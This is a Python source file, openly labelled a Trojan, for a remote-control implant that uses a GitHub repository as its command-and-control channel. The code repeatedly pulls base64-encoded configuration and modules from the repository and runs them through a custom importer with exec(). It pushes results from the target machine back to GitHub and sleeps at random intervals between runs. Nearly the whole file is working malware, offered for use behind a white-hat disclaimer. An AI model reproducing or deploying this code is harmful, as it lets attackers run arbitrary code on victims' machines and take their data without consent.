#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 5th 2024
# Important Note:
#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
# these scripts. They are malicious and should only be used in professionally approved White Hat 
# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
# and if that repository is public, all the extracted data will be available for the whole world to see.
# Description of Script
# This script  implements a Trojan horse program that can be used for remote execution of tasks 
# on a target machine. It uses GitHub as a repository for storing configuration files and modules. 
# The program continuously checks for updates in the repository, retrieves new modules or 
# configurations, and executes them. This allows for dynamic and remote control of the 
# Trojan's behavior. To use the code, you would need to set up a GitHub repository with 
# the necessary configuration files and modules. You would also need to generate a personal 
# access token for GitHub API access. An example of using the code would be to create a 
# repository with a configuration file specifying which modules to run and their parameters. 
# The Trojan would then fetch this configuration, run the specified modules, and store 
# the results back in the repository.  !!Belongs in the config module of the Trojan Framework!!
#################################################################################################
# Import necessary libraries
import base64  
import github3  
import importlib  
import json  
import random  
import sys  
import threading  
import time  
from datetime import datetime

# Function to connect to GitHub using a personal access token
def github_connect():
    # Prompt user for the path to the GitHub Access Token file
    user_input_token = input('Please enter the path to your Github Access Token .txt file: ')
    # Read the token from the file
    with open(f'{user_input_token}') as f:
        token = f.read()
    # Prompt user for their GitHub username
    username = input('Enter username here: ')
    user = f'{username}'
    # Login to GitHub using the token
    sess = github3.login(token=token)
    # Prompt user for the repository name
    trojan_repo = input('Enter Trojan push repository here: ')
    # Return the repository object
    return sess.repository(user, f'{trojan_repo}')

# Function to get the contents of a file from a GitHub repository
def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

# Class for the Trojan horse functionality
class Trojan:
    # Constructor method
    def __init__(self, id):
        # Initialize the ID of the Trojan
        self.id = id
        # Set the configuration file name
        self.config_file = f'{id}.json'
        # Set the data path
        self.data_path = f'data/{id}'
        # Connect to the GitHub repository
        self.repo = github_connect()

    # Method to get the configuration from a JSON file in the repository
    def get_config(self):
        # Get the configuration file contents from the repository
        config_json = get_file_contents('config', self.config_file, self.repo)
        # Decode the base64-encoded JSON data
        config = json.loads(base64.b64decode(config_json))

        # Import modules specified in the configuration if they are not already imported
        for task in config:
            if task['module'] not in sys.modules:
                exec(f"import {task['module']}")

        # Return the configuration
        return config

    # Method to run a module specified in the configuration
    def module_runner(self, module):
        # Run the specified module and store the result
        result = sys.modules[module].run()
        self.store_module_result(result)

    # Method to store the result of running a module in a file in the repository
    def store_module_result(self, data):
        # Generate a timestamp for the result
        message = datetime.now().isoformat()
        # Set the remote path for storing the result
        remote_path = f'data/{self.id}/{message}.data'
        # Encode the result data
        bindata = bytes(f'{data}', 'utf-8')
        # Create a file in the repository with the result data
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    # Method to continuously run the Trojan horse functionality
    def run(self):
        while True:
            # Get the configuration
            config = self.get_config()
            # Run each task in the configuration
            for task in config:
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                thread.start()
                # Sleep for a random amount of time
                time.sleep(random.randint(1, 10))
            # Sleep for a random amount of time
            time.sleep(random.randint(30*60, 3*60*60))

# Class for importing modules from the repository
class GitImporter:
    # Constructor method
    def __init__(self):
        # Initialize the current module code
        self.current_module_code = ""

    # Method to find a module in the repository
    def find_module(self, name, path=None):
        # Print a message indicating the attempt to retrieve a module
        print("[*] Attempting to retrieve %s" % name)
        # Connect to the GitHub repository
        self.repo = github_connect()
        # Get the code for the new module from the repository
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        # If the module is found, store its code
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    # Method to load a module from the repository
    def load_module(self, name):
        # Create a module specification
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        # Create a new module object
        new_module = importlib.util.module_from_spec(spec)
        # Execute the module code and add it to the modules dictionary
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module

# Main section of the script
if __name__ == '__main__':
    # Add GitImporter to the meta path for importing modules
    sys.meta_path.append(GitImporter())
    # Create an instance of the Trojan class with the ID 'modul3s' and run it
    trojan = Trojan('modul3s')
    trojan.run()
